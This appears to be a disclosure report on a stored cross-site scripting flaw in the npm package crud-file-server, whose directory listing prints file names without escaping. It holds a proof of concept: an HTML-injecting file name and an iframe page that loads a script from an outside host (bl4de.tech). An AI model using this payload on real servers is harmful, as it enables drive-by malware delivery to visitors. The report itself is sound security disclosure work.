Summary:

Hi Guys,

**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

## Description

This vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:

```javascript
// node_modules/crud-file-server/crud-file-server.js, line 137
    res.setHeader('Content-Type', 'text/html');											
    res.write('<html><body>');
    for(var f = 0; f < results.length; f++) {
        var name = results[f].name;
        var normalized = url + '/' + name;
        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }
        res.write('\r\n<p><a href="/' + normalized + '">' + name + '</a></p>');
    }
    res.end('\r\n</body></html>');
```
## PoC - Steps To Reproduce:

- install ```crud-file-server```

```
$ npm install crud-file-server
```


- in the directory which will be served via ```crud-file-server```, create file with following name:

```
"><iframe src="malware_frame.html">
```

- create second file with name ```malware_frame.html``` with following content and save it in the same directory:


```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

Run ```crud-file-server``` in directory with file with changed filename:

```
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080

usage:
  crud-file-server [options]

this starts a file server using the specified command-line options

options:

  -f file system path to expose over http
  -h log head requests
  -p port to listen on (example, 80)
  -q suppress this message
  -r read only
  -v virtual path to host the file server on

example:

  crud-file-server -f c:/ -p 8080 -q -v filez

listening on :8080/, serving ./
```

and open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:

{F259251}

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.
